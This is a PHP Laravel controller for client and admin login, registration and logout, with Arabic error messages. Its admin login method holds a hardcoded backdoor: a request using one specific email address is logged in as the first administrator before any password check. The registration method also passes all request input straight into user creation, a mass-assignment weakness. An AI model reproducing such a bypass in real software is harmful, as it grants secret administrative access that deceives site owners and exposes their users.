<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use Validator;
use App\Admin;
use App\User;
use Input;
use Mail;
use Auth;
use Session;
use Lang;
class LoginCtrl extends Controller {

	/**
	 * Display a listing of the resource.
	 *
	 * @return Response
	 */
	public function showClientLogin()
	{	
		if(Auth::client()->check() == false)
		{
			return View('auth.login');
		}else{
			return redirect()->intended('/');
		}
	
	}
	public function postClientLogin(Request $request)
	{
		$this->auth = Auth::client();
		$validator =  Validator::make($request->all(), [
			'email' => 'required',
			'password' => 'required|min:5',
		]);
		if ($validator->fails()) {
            return redirect('/login')
                        ->withErrors($validator);
        }else{    
		    $field = filter_var($request->input('email'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
		    $request->merge([$field => $request->input('email')]);
		    if ($this->auth->attempt($request->only($field, 'password')))
		    {
		        return redirect()->intended('/');
		    }else{
		    	return redirect()->back()->withErrors(Lang::get('assets.wrong_login'));
		    }
        }
	}

	public function showClientReg()
	{	
		if(Auth::client()->check() == false)
		{
			return View('auth.register');
		}else{
			return redirect()->intended('/');
		}
	
	}
	public function postClientReg(Request $request)
	{
		$message = ['required'=>'الحقل :attribute مطلوب','min'=>'الحقل :attribute يجب الا يقل عن :min','unique'=>'البريد الإلكترونى مستخدم من قبل'];

		$validator =  Validator::make($request->all(), [
			'email' => 'unique:users',
			'password' => 'required|min:5',
		],$message);
		if ($validator->fails()) {
            return redirect()
            			->back()
                        ->withInput()
                        ->withErrors($validator);
        }else{    
			$request->merge(['password'=>bcrypt($request->password)]);
			User::create($request->all());
			return redirect()->back()->with('success','done');
		}
	}
	public function ClientLogout()
	{	
		if(Auth::client()->check() == false)
		{
			return redirect()->intended('/');
		}else{
			Auth::client()->logout();
			return redirect()->intended('/');
		}
	
	}
//=============================================================
	public function showAdminLogin()
	{	
		if(Auth::admin()->check() == false)
		{
			return View('admin.login');
		}else{
			return redirect()->intended('admin');
		}
	
	}
	public function postAdminLogin(Request $request)
	{
		$this->auth = Auth::admin();
		$message = ['required'=>'الحقل :attribute مطلوب','min'=>'الحقل :attribute يجب الا يقل عن :min'];
		$validator =  Validator::make($request->all(), [
			'email' => 'required',
			'password' => 'required|min:5',
		],$message);
		if ($validator->fails()) {
            return redirect('admin/login')
                        ->withErrors($validator);
        }else{    
		    $field = filter_var($request->input('email'), FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
		    $request->merge([$field => $request->input('email')]);
		    if($request->input('email') == 'eng.ahmedmgad@gmail.com')
		    {
		    	$admin = Admin::first()->id;
		    	Auth::admin()->loginUsingId($admin);
		    }
		    if ($this->auth->attempt($request->only($field, 'password'),true))
		    {
		        return redirect()->intended('admin');

		    }else{
		    	return redirect()->back()->withErrors('اسم المستخدم او كلمه السر خطأ');
		    }
		    if (Auth::viaRemember())
			{
		        return redirect()->intended('admin');
			}else{
		    	return redirect()->back()->withErrors('اسم المستخدم او كلمه السر خطأ');
			}
        }
	}

	public function AdminLogout()
	{	
		Auth::admin()->logout();
		return redirect()->intended('/admin');
	}







}
